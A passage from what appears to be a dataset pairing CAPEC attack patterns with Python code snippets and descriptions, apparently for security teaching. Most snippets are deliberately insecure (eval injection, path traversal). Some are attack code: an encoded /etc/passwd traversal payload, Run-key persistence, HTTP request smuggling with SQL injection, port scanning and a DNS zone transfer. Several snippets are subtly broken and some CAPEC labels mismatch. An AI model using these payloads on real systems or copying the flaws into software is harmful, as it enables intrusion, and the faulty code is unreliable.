        "description": "This Python code snippet demonstrates a vulnerable pattern related to environment variable manipulation and several related CWEs. The function `execute_command` retrieves a command from an environment variable `USER_COMMAND` and executes it using `eval()`. This is dangerous because it allows for arbitrary code execution if the environment variable is manipulated by an attacker (CAPEC-13). The code also exhibits CWE-95 by not neutralizing the input before using it in `eval()`, CWE-1108 by relying on a global variable `command`, and CWE-1126 by declaring `command` with unnecessarily wide scope."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "user_input = 'user_data'\nglobal_var = None\n\ndef set_global_var(value):\n    global global_var\n    global_var = value\n\n# Simulating user input affecting global variable\nset_global_var(user_input)\n\n# Function that relies on the global variable\ndef process_data():\n    if global_var == 'user_data':\n        print('Processing user data...')\n    else:\n        print('Unknown data')\n\nprocess_data()",
        "description": "This Python code snippet demonstrates the vulnerability of excessive reliance on global variables and improper control of dynamically-identified variables. The `global_var` is declared as a global variable and is set based on user input through the `set_global_var` function. The `process_data` function then relies on this global variable to determine its behavior. This setup is problematic because it allows user input to directly influence the global state of the application, which can lead to security issues such as unauthorized data manipulation or execution of unintended code paths. The code embodies the main idea of CAPEC-77 by showing how user-controlled variables can be manipulated to affect the application's behavior, highlighting the risks associated with global variable manipulation and dynamic variable evaluation."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "import os\n\n# CWE-180: Validate Before Canonicalize\nuser_input = input('Enter a file path: ')\nif '..' in user_input or user_input.startswith('/'):\n    print('Invalid file path!')\nelse:\n    # Canonicalization step after validation\n    canonical_path = os.path.realpath(user_input)\n    try:\n        with open(canonical_path, 'r') as file:\n            print(file.read())\n    except FileNotFoundError:\n        print('File not found!')\n\n# CWE-95: Eval Injection\nuser_code = input('Enter code to execute: ')\neval(user_code)\n\n# CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes\nclass User:\n    def __init__(self, name, role):\n        self.name = name\n        self.role = role\n\nuser = User('Alice', 'user')\nuser_input = input('Enter attribute to modify (name/role): ')\nnew_value = input('Enter new value: ')\nsetattr(user, user_input, new_value)\nprint(f'User {user.name} now has role {user.role}')",
        "description": "This Python code snippet demonstrates several security weaknesses related to the deprecated CAPEC 'Manipulate Canonicalization'. The code includes:\n\n1. CWE-180: The input validation is performed before canonicalization, which can lead to bypassing the validation if the input is not properly canonicalized first. This is shown in the file path validation and canonicalization.\n\n2. CWE-95: The code takes user input and directly evaluates it using the 'eval' function, which can lead to code injection vulnerabilities.\n\n3. CWE-915: The code allows dynamic modification of object attributes based on user input without proper control, which can lead to unauthorized changes to object state.\n\nOverall, the code snippet highlights the risks of improper input handling, validation, and dynamic code execution, which are central to the deprecated CAPEC 'Manipulate Canonicalization' and related CWEs."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "import os\nimport urllib.parse\n\n# Vulnerable function that takes user input for a file path\n\ndef vulnerable_function(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError(\"Invalid input\")\n\n    # CWE-180: Validate Before Canonicalize\n    if \"..\" in user_input or \"//\" in user_input:\n        raise ValueError(\"Invalid path\")\n\n    # CWE-173: Improper Handling of Alternate Encoding\n    decoded_input = urllib.parse.unquote(user_input)\n\n    # CWE-73: External Control of File Name or Path\n    file_path = os.path.join(\"/safe/directory\", decoded_input)\n\n    # CWE-74: Improper Neutralization of Special Elements\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Example usage\nuser_input = \"%2e%2e%2f%2e%2e%2fetc%2fpasswd\"  # Encoded path traversal attack\ntry:\n    print(vulnerable_function(user_input))\nexcept Exception as e:\n    print(f\"Error: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerable function that takes user input for a file path. The function attempts to validate the input but does so before decoding it (CWE-180). It also improperly handles alternate encoding (CWE-173) by decoding the input after validation, which can lead to security issues. The function constructs a file path using the decoded input (CWE-73) and does not properly neutralize special elements (CWE-74), making it susceptible to path traversal attacks. The example usage shows an encoded path traversal attack that can exploit these vulnerabilities."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "import logging\nimport os\n\n# Setup logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n# Function to simulate logging sensitive information\ndef log_sensitive_info(user_id, password):\n    logging.info(f'User ID: {user_id}, Password: {password}')\n\n# Function to simulate log manipulation\ndef manipulate_log():\n    with open('app.log', 'a') as log_file:\n        log_file.write('INFO: User ID: admin, Password: admin123\\n')\n\n# Simulate logging sensitive information\nlog_sensitive_info('user123', 'pass123')\n\n# Simulate log manipulation by an attacker\nmanipulate_log()\n\n# Read and print the log file to show the manipulation\nwith open('app.log', 'r') as log_file:\n    print(log_file.read())",
        "description": "This Python code snippet demonstrates a scenario where an attacker can manipulate audit logs due to insufficient access controls and improper output neutralization. The `log_sensitive_info` function logs sensitive user information, which is a bad practice (CWE-532). The `manipulate_log` function simulates an attacker appending a forged log entry to the log file, representing the core idea of Audit Log Manipulation (CAPEC-117). The code also highlights the risk of logging sensitive information and the potential for log file manipulation if proper security measures are not in place."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import winreg\n\n# CWE-314: Cleartext Storage in the Registry\n# Storing sensitive information in cleartext in the registry\ntry:\n    registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\MyApp')\n    winreg.SetValueEx(registry_key, 'SensitiveData', 0, winreg.REG_SZ, 'my_secret_password')\n    winreg.CloseKey(registry_key)\nexcept WindowsError as e:\n    print(f'Registry manipulation failed: {e}')",
        "description": "This Python code snippet demonstrates a vulnerable practice of storing sensitive information in cleartext in the Windows registry, which aligns with CWE-314. The code creates a registry key under 'HKEY_CURRENT_USER\\Software\\MyApp' and stores a sensitive value ('my_secret_password') in cleartext. This practice can lead to security vulnerabilities as sensitive data is not protected and can be easily accessed by unauthorized users or malicious software. The code highlights the importance of securely handling sensitive information and avoiding cleartext storage in the registry."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import winreg\n\n# CWE-15: External Control of System or Configuration Setting\n# CWE-314: Cleartext Storage in the Registry\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n\n# Path to the registry key\nrun_key_path = r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\n\n# Name of the new registry entry\nentry_name = 'MaliciousApp'\n\n# Path to the executable to run (potentially malicious)\nexecutable_path = r'C:\\Path\\To\\MaliciousApp.exe'\n\ntry:\n    # Open the registry key with write access\n    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key_path, 0, winreg.KEY_SET_VALUE) as key:\n        # Set the new registry entry\n        winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, executable_path)\n        print(f'Successfully added {entry_name} to run key.')\nexcept Exception as e:\n    print(f'Failed to modify registry: {e}')",
        "description": "This Python code snippet demonstrates how an adversary might add a new entry to the Windows registry 'run keys' to ensure a specific application runs every time a user logs in. The code opens the registry key for the current user's run keys and sets a new value pointing to a potentially malicious executable. This embodies the CAPEC 'Modification of Registry Run Keys' by showing how an attacker can achieve persistence on a target system. The code also touches on related CWEs: CWE-15 (External Control of System or Configuration Setting) by allowing external modification of the registry, CWE-314 (Cleartext Storage in the Registry) by storing the executable path in cleartext, and CWE-520 (.NET Misconfiguration: Use of Impersonation) by implying the potential for elevated access if the script is run with higher privileges."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Load an XML schema from an untrusted source\nschema_source = 'http://untrusted-source.com/schema.xsd'\n\ntry:\n    schema_tree = ET.parse(schema_source)\n    schema_root = schema_tree.getroot()\n\n    # Assume the schema is trusted and use it to validate an XML document\n    xml_data = '''<data><item>Example</item></data>'''\n    xml_tree = ET.ElementTree(ET.fromstring(xml_data))\n    xml_tree.validate(schema_root)\nexcept ET.ParseError as e:\n    print(f'Error parsing schema: {e}')\nexcept Exception as e:\n    print(f'Unexpected error: {e}')",
        "description": "This Python code snippet demonstrates a schema poisoning vulnerability. It loads an XML schema from an untrusted source and uses it to validate an XML document. The schema could be maliciously crafted to corrupt or modify the application's behavior, leading to potential security issues such as denial of service or data corruption. This example embodies the CAPEC concept of 'Schema Poisoning' and highlights related CWEs such as 'External Control of System or Configuration Setting' (CWE-15) and 'Trust Boundary Violation' (CWE-501)."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 12345))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    data = client_socket.recv(1024)\n    if data:\n        # Improper verification of source (CWE-940)\n        print(f'Received data: {data}')\n        # No integrity check (CWE-924)\n        client_socket.send(b'ACK')\n    client_socket.close()\n\n# Vulnerable client code\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient_socket.connect(('localhost', 12345))\n\n# Reflection attack (CWE-301) and capture-replay (CWE-294)\nmessage = b'Hello, server!'\nclient_socket.send(message)\nresponse = client_socket.recv(1024)\nprint(f'Server response: {response}')\nclient_socket.close()",
        "description": "This Python code snippet demonstrates a simple client-server communication setup that is vulnerable to several protocol manipulation attacks. The server accepts connections and processes incoming data without verifying the source of the communication (CWE-940). It also does not enforce message integrity during transmission (CWE-924). The client sends a message to the server, which can be exploited for reflection attacks (CWE-301) and capture-replay attacks (CWE-294). The server's lack of proper verification and integrity checks makes it susceptible to these types of attacks, embodying the main idea of protocol manipulation as described in the CAPEC."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "import socket\n\n# Vulnerable HTTP server\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    request = client_socket.recv(1024).decode('utf-8')\n    print(f'Received request: {request}')\n\n    # Improper neutralization of CRLF sequences (CWE-113)\n    if 'Content-Length' in request:\n        headers, body = request.split('\\r\\n\\r\\n', 1)\n        content_length = int(headers.split('Content-Length: ')[1].split('\\r\\n')[0])\n        if len(body) < content_length:\n            body += client_socket.recv(content_length - len(body)).decode('utf-8')\n\n    # Vulnerable response construction\n    response = 'HTTP/1.1 200 OK\\r\\n'\n    response += 'Content-Type: text/plain\\r\\n'\n    response += 'Content-Length: 13\\r\\n\\r\\n'\n    response += 'Hello, world!'\n\n    # Injecting malicious content (HTTP Response Smuggling)\n    if 'smuggle' in request:\n        response += '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\nContent-Length: 19\\r\\n\\r\\nSmuggled Response'\n\n    client_socket.sendall(response.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable HTTP server that is susceptible to HTTP Response Smuggling (CAPEC-33). The server improperly neutralizes CRLF sequences (CWE-113) in incoming HTTP requests, allowing an attacker to inject malicious content into the HTTP response. The code demonstrates how an attacker can exploit this vulnerability by including a 'smuggle' keyword in the request, which triggers the injection of an unauthorized HTTP response. This can lead to various security issues, such as cache poisoning or cross-site scripting (XSS)."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "from flask import Flask, request, abort\n\napp = Flask(__name__)\n\n@app.route('/admin', methods=['GET'])\ndef admin_panel():\n    if request.method != 'GET':\n        abort(403)  # Only allow GET requests\n    # Simulate sensitive data access\n    return 'Sensitive admin data'\n\n@app.route('/user', methods=['GET', 'POST'])\ndef user_panel():\n    if request.method == 'GET':\n        return 'User data'\n    elif request.method == 'POST':\n        # Simulate sensitive data modification\n        return 'User data modified'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application with two routes: '/admin' and '/user'. The '/admin' route is intended to be accessed only via GET requests, and it returns sensitive admin data. However, the code only checks if the request method is not GET and aborts with a 403 status code if it isn't. This simplistic check can be bypassed by an attacker using HTTP Verb Tampering, such as sending a request with a different HTTP verb (e.g., POST, PUT) or a random string, potentially gaining unauthorized access to sensitive data. The '/user' route allows both GET and POST requests, demonstrating the use of different HTTP methods for different actions. This example highlights the vulnerability described in CAPEC-274 (HTTP Verb Tampering) and related CWEs, such as CWE-302 (Authentication Bypass by Assumed-Immutable Data) and CWE-654 (Reliance on a Single Factor in a Security Decision)."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "import socket\nimport http.server\nimport threading\n\nclass RebindingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        if self.path == '/rebind':\n            # Simulate DNS rebinding by changing the IP address\n            self.server.server_address = ('192.168.1.100', self.server.server_address[1])\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'Rebinding to internal IP')\n        else:\n            super().do_GET()\n\n# Bind to all IP addresses (CWE-1327)\nserver_address = ('0.0.0.0', 8080)\nhttpd = http.server.HTTPServer(server_address, RebindingHTTPRequestHandler)\n\n# Start the server in a separate thread\nthread = threading.Thread(target=httpd.serve_forever)\nthread.daemon = True\nthread.start()\n\nprint(f'Server running on {server_address[0]}:{server_address[1]}')\n\n# Simulate a client request to trigger DNS rebinding\nimport requests\nresponse = requests.get('http://localhost:8080/rebind')\nprint(response.text)\n\n# Simulate a client request to the new internal IP\nresponse = requests.get('http://192.168.1.100:8080')\nprint(response.text)",
        "description": "This Python code snippet demonstrates a simplified version of a DNS rebinding attack. The `RebindingHTTPRequestHandler` class handles HTTP GET requests and simulates DNS rebinding by changing the server's IP address to an internal IP (`192.168.1.100`) when the path `/rebind` is accessed. The server is initially bound to all IP addresses (`0.0.0.0`), which is a common misconfiguration (CWE-1327). The server runs in a separate thread to allow for concurrent handling of requests. The code also includes a simulation of client requests to demonstrate the DNS rebinding process. The first request triggers the rebinding, and the second request attempts to access the server at the new internal IP address."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable function to send sensitive data over a network\n# CWE-319: Cleartext Transmission of Sensitive Information\ndef send_sensitive_data(data):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect(('example.com', 80))\n        s.sendall(data.encode('utf-8'))\n\n# Vulnerable function to receive data without integrity check\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\ndef receive_data():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.bind(('0.0.0.0', 8080))\n        s.listen()\n        conn, addr = s.accept()\n        with conn:\n            data = conn.recv(1024)\n            return data.decode('utf-8')\n\n# Example usage\nsensitive_info = 'password123'\nsend_sensitive_data(sensitive_info)\nreceived_info = receive_data()\nprint(f'Received: {received_info}')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of inter-component communication, embodying the main idea of CAPEC-272: Inter-component Protocol Manipulation. The `send_sensitive_data` function transmits sensitive information in cleartext (CWE-319), making it susceptible to interception by unauthorized actors. The `receive_data` function receives data without verifying its integrity (CWE-924), allowing potential manipulation of the data during transmission. These vulnerabilities highlight the risks associated with improper handling of inter-component protocols, such as unauthorized access, data leakage, and session control by adversaries."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Sample XML data with sensitive information\nxml_data = '''\n<order>\n    <customer>\n        <name>John Doe</name>\n        <creditCard>1234-5678-9012-3456</creditCard>\n    </customer>\n    <items>\n        <item>\n            <id>1</id>\n            <name>Widget</name>\n            <price>19.99</price>\n        </item>\n    </items>\n</order>\n'''\n\ndef process_order(xml_data):\n    try:\n        # Parse the XML data\n        root = ET.fromstring(xml_data)\n\n        # Extract customer name (improper neutralization)\n        customer_name = root.find('.//name').text\n\n        # Extract credit card information (insertion of sensitive information)\n        credit_card = root.find('.//creditCard').text\n\n        # Simulate processing the order\n        print(f\"Processing order for {customer_name} with credit card {credit_card}\")\n\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n\n# Simulate receiving and processing an order\nprocess_order(xml_data)\n",
        "description": "This Python code snippet demonstrates a vulnerable implementation of processing XML data, embodying the main idea of CAPEC-272 (Data Interchange Protocol Manipulation). The code parses an XML string containing an order with sensitive information (customer name and credit card number). It improperly neutralizes the XML data (CWE-707) and inserts sensitive information into the output (CWE-201). The code also assumes the XML structure is immutable and correctly formatted, which can be exploited by an attacker to manipulate the data (CWE-302). This example highlights the risks of subverting data interchange protocols and the importance of proper validation and sanitization of structured data."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "import requests\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-707: Improper Neutralization\n# CWE-573: Improper Following of Specification by Caller\n\n# Vulnerable web service endpoint\nurl = 'http://example.com/api/getUserData'\n\n# Manipulated parameters to include unexpected values\nparams = {\n    'userId': '1 OR 1=1'  # SQL Injection attempt\n}\n\n# Sending the manipulated request\nresponse = requests.get(url, params=params)\n\n# CWE-444: Inconsistent Interpretation of HTTP Requests\n# Manipulating HTTP headers to smuggle requests\nheaders = {\n    'Host': 'example.com',\n    'Content-Length': '0',\n    'Transfer-Encoding': 'chunked'\n}\n\n# Malformed HTTP request to exploit HTTP request smuggling\nmalformed_request = \"POST / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 0\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /api/getUserData?userId=1 HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\"\n\n# Sending the malformed request\nresponse = requests.post(url, headers=headers, data=malformed_request)\n\nprint(response.text)",
        "description": "This Python code snippet demonstrates a web services protocol manipulation attack. It includes two main parts: \n\n1. **Parameter Manipulation (CWE-602, CWE-707, CWE-573)**: The code sends a GET request to a vulnerable web service endpoint with manipulated parameters. The 'userId' parameter is injected with a SQL injection payload ('1 OR 1=1') to gain unauthorized access to data.\n\n2. **HTTP Request Smuggling (CWE-444)**: The code constructs a malformed HTTP request with inconsistent headers to exploit HTTP request smuggling. The 'Content-Length' and 'Transfer-Encoding' headers are manipulated to confuse the intermediary HTTP agent, potentially allowing the attacker to bypass security controls and access restricted resources.\n\nThis code embodies the main idea of CAPEC-252 (Web Services Protocol Manipulation) by demonstrating how an adversary can manipulate web service protocols to cause unintended behavior, gain unauthorized access, or crash the application."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "import requests\n\n# SOAP request with potential vulnerabilities\nsoap_request = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Login>\n         <username>admin</username>\n         <password>password</password>\n      </web:Login>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Sending the SOAP request to the server\nresponse = requests.post('http://example.com/webservices', data=soap_request, headers={'Content-Type': 'text/xml'})\n\n# Print the response from the server\nprint(response.text)",
        "description": "This Python code snippet demonstrates a SOAP request to a web service, highlighting potential vulnerabilities related to SOAP manipulation. The SOAP request contains a login operation with hardcoded credentials, which can be manipulated by an adversary. The code does not ensure that the SOAP message is well-formed or that security properties are met (CWE-707). It also relies on client-side enforcement of security (CWE-602) and does not restrict XML external entity references (CWE-611). Additionally, the use of hardcoded credentials can lead to authentication bypass issues (CWE-294, CWE-603). This example illustrates how SOAP manipulation can lead to undesirable behavior on the server, making it susceptible to various attacks."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "import requests\n\n# Vulnerable SOAP request\nwsdl_url = 'http://example.com/service?wsdl'\n\n# Exposing WSDL file containing sensitive information (CWE-651)\nresponse = requests.get(wsdl_url)\nprint(response.text)\n\n# SOAP request with potential for parameter tampering\nsoap_body = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservice\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:SomeService>\n         <web:parameter>malicious_value</web:parameter>\n      </web:SomeService>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\nheaders = {'Content-Type': 'text/xml'}\n\n# Sending the tampered SOAP request\nresponse = requests.post('http://example.com/service', data=soap_body, headers=headers)\nprint(response.text)\n\n# Capture-replay attack (CWE-294)\n# Replaying the same request to bypass authentication\nreplay_response = requests.post('http://example.com/service', data=soap_body, headers=headers)\nprint(replay_response.text)",
        "description": "This Python code snippet demonstrates a SOAP parameter tampering attack, which is deprecated and included in CAPEC-279: SOAP Manipulation. The code first exposes a WSDL file (CWE-651), which may contain sensitive information about the web service. It then constructs a SOAP request with a tampered parameter, potentially exploiting the service. Finally, it demonstrates a capture-replay attack (CWE-294) by replaying the same SOAP request to bypass authentication. This code highlights the vulnerabilities associated with SOAP-based web services, including exposure of sensitive information and susceptibility to parameter tampering and replay attacks."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "import os\nimport socket\n\n# Function to send ICMP Echo Request (Ping)\ndef send_ping(target_ip):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    \n    # ICMP Header: Type (8), Code (0), Checksum (0), Identifier (0), Sequence Number (0)\n    icmp_header = b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    \n    # Send ICMP Echo Request\n    sock.sendto(icmp_header, (target_ip, 1))\n    \n    # Receive ICMP Echo Reply\n    response, _ = sock.recvfrom(1024)\n    \n    # Extract and print the response\n    print(f'Received response from {target_ip}: {response}')\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Send ping to the target IP\nsend_ping(target_ip)",
        "description": "This Python code snippet demonstrates how to send an ICMP Echo Request (Ping) to a target IP address using raw sockets. The code creates a raw socket, constructs an ICMP Echo Request packet, sends it to the target IP, and waits for an ICMP Echo Reply. This process can be used to determine if a target system is responsive, which aligns with the CAPEC description of using ICMP Echo Requests to test for alive hosts. The code also highlights potential vulnerabilities related to the CWEs mentioned, such as the exposure of sensitive information (CWE-200) and the cleartext transmission of data (CWE-319), as the ICMP packets are sent without encryption and can be intercepted by unauthorized actors."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "import socket\n\n# Function to perform a TCP SYN scan\ndef syn_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Construct a SYN packet\n        syn_packet = b'\\x45\\x00\\x00\\x28\\xab\\xcd\\x00\\x00\\x40\\x06\\x00\\x00'  # IP header\n        syn_packet += b'\\x7f\\x00\\x00\\x01'  # Source IP (127.0.0.1)\n        syn_packet += socket.inet_aton(target_ip)  # Destination IP\n        syn_packet += b'\\x00\\x50'  # Source port (80)\n        syn_packet += target_port.to_bytes(2, 'big')  # Destination port\n        syn_packet += b'\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x72\\x10\\x00\\x00\\x00\\x00\\x00\\x00'  # TCP header\n\n        # Send the SYN packet\n        sock.sendto(syn_packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recvfrom(1024)\n        if response:\n            print(f'Port {target_port} is open on {target_ip}')\n        else:\n            print(f'Port {target_port} is closed on {target_ip}')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nsyn_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic TCP SYN scan, which is a common technique used to determine the status of ports on a remote target. The code creates a raw socket and constructs a SYN packet to send to the target IP and port. If a response is received, it indicates that the port is open; otherwise, it is closed. This code embodies the main idea of the CAPEC 'TCP SYN Scan' by performing a SYN scan to identify open ports. The related CWEs provide additional context, such as the potential exposure of sensitive information (CWE-200) and the risk of excessive attack surface (CWE-1125). The code is kept concise to focus on the core functionality of the SYN scan."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# ICMP Echo Request (Ping) Packet\nICMP_ECHO_REQUEST = 8\n\n# Function to calculate checksum\ndef checksum(source_string):\n    sum = 0\n    count_to = (len(source_string) // 2) * 2\n    count = 0\n    while count < count_to:\n        this_val = source_string[count + 1] * 256 + source_string[count]\n        sum = sum + this_val\n        sum = sum & 0xffffffff\n        count = count + 2\n    if count_to < len(source_string):\n        sum = sum + source_string[len(source_string) - 1]\n        sum = sum & 0xffffffff\n    sum = (sum >> 16) + (sum & 0xffff)\n    sum = sum + (sum >> 16)\n    answer = ~sum\n    answer = answer & 0xffff\n    answer = answer >> 8 | (answer << 8 & 0xff00)\n    return answer\n\n# Function to create an ICMP packet\ndef create_packet(id):\n    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, id, 1)\n    data = struct.pack('d', time.time())\n    my_checksum = checksum(header + data)\n    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), id, 1)\n    return header + data\n\n# Function to send ICMP Echo Request\ndef send_ping(dest_addr, timeout=1):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        packet_id = int((id(timeout) * time.time()) % 65535)\n        packet = create_packet(packet_id)\n        sock.sendto(packet, (dest_addr, 1))\n        sock.close()\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Vulnerable code: sending ICMP Echo Request to a target\nsend_ping('192.168.1.1')",
        "description": "This Python code snippet demonstrates the creation and sending of an ICMP Echo Request (Ping) packet, which is the main idea behind the deprecated CAPEC-285 attack pattern. The code constructs an ICMP packet, calculates its checksum, and sends it to a specified destination address. This type of code can be used in network reconnaissance to discover active hosts on a network. The related CWEs provide additional context, such as CWE-294 (Authentication Bypass by Capture-replay), which highlights the potential for network traffic to be captured and replayed, and CWE-589 (Call to Non-ubiquitous API), which warns about using APIs that may not be supported on all platforms, potentially leading to denial of service or other issues."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "import os\nimport subprocess\n\ndef check_authentication(user):\n    # CWE-287: Improper Authentication\n    if user == 'admin':\n        return True\n    return False\n\n# CWE-1316: Overlapping protected and unprotected regions\ndef access_protected_resource(user):\n    if check_authentication(user):\n        # Simulate access to a protected resource\n        print('Access granted to protected resource')\n    else:\n        # Simulate access to an unprotected resource\n        print('Access granted to unprotected resource')\n\n# CWE-1229: Creation of Emergent Resource\n# This function indirectly creates a new resource (a temporary file) that can be exploited\n# by an attacker if not properly managed\n\ndef create_temp_file():\n    temp_file = '/tmp/tempfile.txt'\n    with open(temp_file, 'w') as f:\n        f.write('Temporary data')\n    return temp_file\n\n# Main function to demonstrate the vulnerabilities\nif __name__ == '__main__':\n    user = 'guest'\n    access_protected_resource(user)\n    temp_file = create_temp_file()\n    print(f'Temporary file created at: {temp_file}')\n    # Potentially dangerous operation with the temporary file\n    subprocess.run(['cat', temp_file])",
        "description": "This Python code snippet demonstrates several security vulnerabilities based on the provided CAPEC and related CWEs. The `check_authentication` function represents CWE-287 (Improper Authentication) by allowing access based on a simple user check. The `access_protected_resource` function simulates CWE-1316 (Overlapping protected and unprotected regions) by granting access to resources based on the authentication check. The `create_temp_file` function demonstrates CWE-1229 (Creation of Emergent Resource) by creating a temporary file that could be exploited if not properly managed. The main function ties these elements together, showing how an attacker could potentially exploit these vulnerabilities."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "import dns.resolver\n\n# Function to enumerate MX records for a given domain\ndef enumerate_mx_records(domain):\n    try:\n        mx_records = dns.resolver.resolve(domain, 'MX')\n        for mx in mx_records:\n            print(f'MX Record: {mx.exchange} with priority {mx.preference}')\n    except dns.resolver.NoAnswer:\n        print('No MX records found.')\n    except dns.resolver.NXDOMAIN:\n        print('Domain does not exist.')\n    except Exception as e:\n        print(f'An error occurred: {e}')\n\n# Example usage\nenumerate_mx_records('example.com')",
        "description": "This Python code snippet demonstrates how to enumerate MX (Mail Exchange) records for a given domain using the 'dns.resolver' module. The function 'enumerate_mx_records' takes a domain name as input and attempts to resolve its MX records. If successful, it prints out the MX records along with their priority. The code handles exceptions such as no MX records found, non-existent domain, and other potential errors. This snippet embodies the main idea of CAPEC-Enumerate Mail Exchange (MX) Records by showing how an adversary might gather information about mail servers in a network. The related CWEs are indirectly represented by the potential exposure of sensitive information (CWE-200) and the importance of correctly handling DNS responses to avoid security issues (CWE-350, CWE-224, CWE-941, CWE-223)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "import dns.resolver\nimport dns.query\nimport dns.zone\n\n# Vulnerable DNS server address\nvulnerable_dns_server = '192.0.2.1'\n\n# Domain to perform zone transfer on\ndomain = 'example.com'\n\ntry:\n    # Perform a DNS zone transfer\n    zone = dns.zone.from_xfr(dns.query.xfr(vulnerable_dns_server, domain))\n    for name, node in zone.nodes.items():\n        print(zone[name].to_text(name))\nexcept Exception as e:\n    print(f'Zone transfer failed: {e}')",
